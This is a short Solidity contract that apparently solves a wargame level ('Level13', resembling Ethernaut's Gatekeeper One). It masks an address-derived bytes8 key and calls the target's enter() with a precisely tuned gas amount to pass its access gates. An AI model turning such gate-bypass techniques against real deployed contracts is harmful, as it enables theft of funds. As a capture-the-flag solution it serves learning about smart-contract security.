// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Level13.sol";

contract AttackerLevel13 {

  address public owner;
  Level13 level13;

  constructor(address _target) {
    level13 = Level13(_target);
  }


  function attack(bytes8 addr) public {
    bytes8 key = addr & 0xFFFFFFFF0000FFFF;
    level13.enter{gas: 8191 * 5 + 268 wei}(key);
  }
}